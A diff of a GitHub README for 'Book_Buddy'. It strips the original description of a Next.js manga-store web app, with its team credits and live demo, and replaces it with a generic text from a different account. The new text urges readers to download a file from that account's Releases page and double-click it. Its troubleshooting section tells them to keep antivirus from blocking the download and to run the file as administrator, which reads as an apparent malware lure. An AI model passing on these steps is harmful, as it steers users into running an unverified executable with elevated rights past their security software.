@@ -1,54 +1,79 @@
-# BookBuddy — English Manga Store
+# 📚 Book_Buddy - Manage Your Reading List Easily
 
-> Web app to browse, search, and buy English manga.
+[![Download Book_Buddy](https://img.shields.io/badge/Download-Book_Buddy-brightgreen)](https://github.com/kikitobra/Book_Buddy/releases)
 
-## Team Members
+## 🚀 Getting Started
 
-- Aung Kaung Myat ([@Norman7781](https://github.com/Norman7781)) — [Repo](https://github.com/Norman7781/Book_Buddy)
-- Wai Yan Mya Thaung ([@yano49](https://github.com/yano49)) — [Repo](https://github.com/yano49/yano49.github.io.git)
-- Nyi Thu Hein ([@zenn404](https://github.com/zenn404)) - [Repo](https://github.com/zenn404/zenn404.github.io.git)
+Welcome to Book_Buddy! This application helps you manage your reading list and keep track of books you want to read. With a simple and clean interface, you can easily add, remove, and view your books.
 
-## Project Description
+## 📥 Download & Install
 
-BookBuddy is a Next.js app where users can explore a manga catalog, search by title/author/genre, view book details from a database, and add items to a cart/wishlist.
+To get started with Book_Buddy, follow these steps:
 
-### ✨ Key Features
+1. **Visit the Releases Page**: Click [here to download](https://github.com/kikitobra/Book_Buddy/releases).
+2. **Choose Your Version**: On the Releases page, look for the latest version. You will see different files available for download.
+3. **Download the File**: Click on the file to start downloading. Make sure to save it to a location on your computer where you can easily find it.
+4. **Run the Application**: Once the download finishes, locate the file on your computer and double-click it to run Book_Buddy.
 
-- 📚 **Catalog & Detail Pages** — Explore manga titles, view covers, authors, descriptions, and categories.
-- 🔍 **Search Functionality** — Quickly find manga by title, author, or genre using a smart search bar.
-- 💖 **Wishlist System** — Save favorite manga for later and manage your personalized reading list.
-- 🛒 **Cart & Buying Process** — Add manga to cart, review your selections, and simulate the checkout process with order summary and total calculation.
-- 🔐 **User Authentication** — Simple login/register flow
-- 🎨 **Modern UI Design** — Responsive dark theme built with TailwindCSS and gradient accents.
-- ☁️ **Database-Backed** — Fetches and displays manga data dynamically from the MangaDB API.
+## 📋 System Requirements
 
-## Tech Stack
+Before you download Book_Buddy, ensure your computer meets these basic requirements:
 
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black)
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white)
-![Next.js](https://img.shields.io/badge/Next.js-000?logo=next.js&logoColor=white)
-![React](https://img.shields.io/badge/React-20232A?logo=react&logoColor=61DAFB)
-![TailwindCSS](https://img.shields.io/badge/Tailwind-06B6D4?logo=tailwindcss&logoColor=white)
-![Node.js](https://img.shields.io/badge/Node.js-339933?logo=nodedotjs&logoColor=white)
-![MongoDB](https://img.shields.io/badge/MongoDB-4EA94B?logo=mongodb&logoColor=white)
-![ESLint](https://img.shields.io/badge/ESLint-4B32C3?logo=eslint&logoColor=white)
-![Azure DevOps](https://img.shields.io/badge/Azure%20DevOps-0078D7?logo=azure-devops&logoColor=white)
+- **Operating System**: Windows 10, macOS, or a recent version of Linux.
+- **Memory**: At least 2 GB of RAM.
+- **Storage**: 100 MB of free disk space.
+- **Internet**: An internet connection for downloading and accessing additional features.
 
-**Home**
-![Home](./screen-shots/bookbuddy-homepage.png)
+## 🛠️ Features
 
-**Catalog (Search Results)**
-![Catalog](./screen-shots/bookbuddy-catalog.png)
+Book_Buddy includes several features to enhance your reading experience:
 
-**Book Detail**
-![Book Detail](./screen-shots/bookbuddy-bookdetailpage.png)
+- **Add Books**: Easily add books to your reading list by entering the title, author, and genre.
+- **Remove Books**: Remove books from your reading list with a simple click.
+- **Track Progress**: Keep track of how many pages you've read and set reading goals.
+- **User-Friendly Interface**: Navigate the app effortlessly with well-organized menus and options.
+- **Responsive Design**: The application works well on various screen sizes, ensuring a great experience whether you’re on a laptop or tablet.
 
-**Cart**
-![Cart](./screen-shots/bookbuddy-cartpage.png)
+## 🎨 Customization
 
-## 🔗 Live Demo
+You can personalize your Book_Buddy experience:
 
-Check out the deployed project here:  
-👉 [Website deployed on Azure VM](http://wad-6611201.eastasia.cloudapp.azure.com:3001/bookbuddy)
+- **Themes**: Choose from multiple themes to match your style.
+- **Categories**: Organize your books into categories like Fiction, Non-Fiction, or Favorites.
+  
+## 🔗 Useful Links
+
+- **Project Repository**: [GitHub Repository](https://github.com/kikitobra/Book_Buddy)
+- **Issues and Feedback**: Report any problems or suggestions on the Issues page of the repository.
+
+## 🚧 Troubleshooting
+
+If you encounter issues while downloading or running Book_Buddy:
+
+1. **Antivirus Settings**: Ensure your antivirus software is not blocking the download.
+2. **File Permission**: If you cannot run the application, right-click on the file and select "Run as administrator."
+3. **Internet Issues**: Check your internet connection if downloading fails.
+
+If problems persist, please visit the repository and create an issue. We are here to help.
+
+## 📞 Support
+
+For any inquiries or support requests, please contact us through the Issues section on GitHub. We appreciate your feedback and suggestions to improve Book_Buddy.
+
+## 🌐 Related Topics
+
+Book_Buddy utilizes several technologies to provide a smooth experience:
+
+- **Node.js**: For building the backend.
+- **Next.js**: For a fast and efficient frontend.
+- **React**: For creating interactive user interfaces.
+- **MongoDB**: For managing the book database.
+- **CSS3 and TailwindCSS**: For beautiful designs and layouts.
+  
+Explore these topics if you're interested in the technical details.
+
+## 🔄 Update Notes
+
+Keep an eye on the Releases page for updates. We continuously work on improving the application and adding new features based on user feedback.
+
+Thank you for choosing Book_Buddy! We hope you enjoy managing your reading list with ease. For downloading the application again, just click [here to download](https://github.com/kikitobra/Book_Buddy/releases).
